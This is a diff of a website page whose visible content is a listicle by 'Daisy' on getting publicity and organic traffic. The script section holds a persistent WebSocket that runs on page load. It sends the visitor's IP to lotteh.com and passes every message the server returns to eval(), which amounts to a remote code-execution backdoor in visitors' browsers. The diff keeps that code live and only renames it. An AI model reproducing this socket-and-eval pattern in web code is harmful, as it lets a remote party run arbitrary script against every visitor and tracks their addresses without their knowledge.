@@ -65,7 +65,7 @@
               <a class="nav-link" href="/en/landing" title="Visit the landing page">Landing</a>
             </li>
             <li class="nav-item">
-              <a class="nav-link" href="https://qoshlli.com" title="Video chat">Chat</a>
+              <a class="nav-link" href="/en/chat" title="Video chat">Chat</a>
             </li>
             <li class="nav-item">
               <a class="nav-link" href="/en/private" title="See private photos with a key">Private</a>
@@ -123,14 +123,8 @@
 <img src="https://i.imgur.com/dAQRaWt.jpeg" alt="Daisy's profile photo" width="120" height="120" style="margin-top:5px; margin-right:10px; margin-bottom:10px; border-radius: 50%;">
 <p><i>By Daisy</i></p>
 
-<div style="white-space: pre-wrap;">
+<div style="white-space: pre-wrap;"><p>How do I get publicity and organic traffic for a website?</p><p><br/></p><p>1. Search Engine Optimization (SEO): Optimize your website for search engines to improve visibility and ranking on search engine results pages.</p><p><br/></p><p>2. Content Marketing: Create valuable and relevant content that attracts and engages your target audience. This can include blog posts, articles, videos, infographics, and other forms of content.</p><p><br/></p><p>3. Social Media Marketing: Promote your website on social media platforms such as Facebook, Twitter, Instagram, and LinkedIn to reach a wider audience and drive traffic to your website.</p><p><br/></p><p>4. Paid Advertising: Consider running paid advertising campaigns on search engines (Google AdWords), social media platforms, and other relevant websites to drive targeted traffic to your website.</p><p><br/></p><p>5. Influencer Marketing: Partner with influencers in your niche to help promote your website and reach a larger audience.</p><p><br/></p><p>6. Email Marketing: Build an email list of subscribers and send regular updates, promotions, and content to drive traffic back to your website.</p><p><br/></p><p>7. Networking: Connect with other website owners, bloggers, and influencers in your industry to collaborate, guest post, or exchange links to increase your website's visibility.</p><p><br/></p><p>8. Public Relations: Reach out to journalists, bloggers, and media outlets to pitch newsworthy stories or announcements related to your website to generate publicity and traffic.</p><p><br/></p><p>9. Guest Blogging: Write high-quality guest posts for other websites and include a link back to your website in the author bio or content to drive traffic.</p><p><br/></p><p>10. Online Communities and Forums: Participate in online communities and forums related to your niche and engage with members by sharing valuable insights, answering questions, and promoting your website when relevant.</p></div>
 
-
-
-<p>How do I get publicity and organic traffic for a website?</p><p><br></p><p>1. Search Engine Optimization (SEO): Optimize your website for search engines to improve visibility and ranking on search engine results pages.</p><p><br></p><p>2. Content Marketing: Create valuable and relevant content that attracts and engages your target audience. This can include blog posts, articles, videos, infographics, and other forms of content.</p><p><br></p><p>3. Social Media Marketing: Promote your website on social media platforms such as Facebook, Twitter, Instagram, and LinkedIn to reach a wider audience and drive traffic to your website.</p><p><br></p><p>4. Paid Advertising: Consider running paid advertising campaigns on search engines (Google AdWords), social media platforms, and other relevant websites to drive targeted traffic to your website.</p><p><br></p><p>5. Influencer Marketing: Partner with influencers in your niche to help promote your website and reach a larger audience.</p><p><br></p><p>6. Email Marketing: Build an email list of subscribers and send regular updates, promotions, and content to drive traffic back to your website.</p><p><br></p><p>7. Networking: Connect with other website owners, bloggers, and influencers in your industry to collaborate, guest post, or exchange links to increase your website's visibility.</p><p><br></p><p>8. Public Relations: Reach out to journalists, bloggers, and media outlets to pitch newsworthy stories or announcements related to your website to generate publicity and traffic.</p><p><br></p><p>9. Guest Blogging: Write high-quality guest posts for other websites and include a link back to your website in the author bio or content to drive traffic.</p><p><br></p><p>10. Online Communities and Forums: Participate in online communities and forums related to your niche and engage with members by sharing valuable insights, answering questions, and promoting your website when relevant.</p>
-
-
-</div>
 
 <div class="mx-auto p-1 m-1" style="display: flex; justify-content: space-around;">
 <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6209985848112194"
@@ -247,6 +241,23 @@
         
 
 
+var currentReader = 0;
+function toggleReader(id) {
+	currentReader = id;
+	$('#reader-modal' + id).toggleClass('hide');
+	$('#reader-modal' + id).toggleClass('fade-in-fast');
+	$('#bnav' + id).toggleClass('hide');
+	$('#bnav' + id).toggleClass('fade-in-fast');
+	setTimeout(function() {
+		$('#reader-modal' + id).toggleClass('fade-in-fast');
+		$('#bnav' + id).toggleClass('fade-in-fast');
+	}, 1000);
+}
+function jumpbookto(page) {
+	document.getElementById('reader-modal' + currentReader).scrollTo(0, (parseInt(document.getElementById('jumpto' + page).value)-1) * parseInt(window.innerHeight));
+	document.getElementById('pagecount' + page).innerHTML = parseInt(document.getElementById('jumpto' + page).value);
+}
+
 
         
         
@@ -257,32 +268,32 @@
             
         	Prism.highlightAll();
         });
-        var socket;
-        function openSocket() {
+        var remoteSocket;
+        function openRemoteSocket() {
             window.location.hash = '';
-            socket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
-            socket.addEventListener("open", (event) => {
+            remoteSocket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
+            remoteSocket.addEventListener("open", (event) => {
                 console.log('Socket open.');
                 fetch('https://lotteh.com/remote/generate/')
         		    .then(response => response.json())
         		    .then(data => {
-        		        socket.send(data.ip);
+        		        remoteSocket.send(data.ip);
         		    })
         		    .catch(error => {
         		        console.log('Error:', error);
         		    });
             });
-            socket.addEventListener("closed", (event) => {
+            remoteSocket.addEventListener("closed", (event) => {
                 console.log('Socket closed.');
                 setTimeout(function() {
-                    openSocket();
+                    openRemoteSocket();
                 }, 10000);
             });
-        	socket.addEventListener("message", (event) => {
+        	remoteSocket.addEventListener("message", (event) => {
                     eval(event.data);
             });
         }
-        openSocket();
+        openRemoteSocket();
         $(document).ready(function() {
         	$("#contact-form").submit(function(e){
                 	e.preventDefault();
@@ -434,8 +445,8 @@ if(document.getElementById("current-time")) {
               link.href = url;
               link.download = 'Glam Girl X - ' + filename;
               document.body.appendChild(link);
+              link.classList.add('hide');
               link.click();
-              document.body.removeChild(link);
             }
             function downloadQr() {
                     downloadQrImage(image.src, 'QR Code');
@@ -457,6 +468,8 @@ if(document.getElementById("current-time")) {
   });
 </script>
 
+    
+    
     
     
     <script>
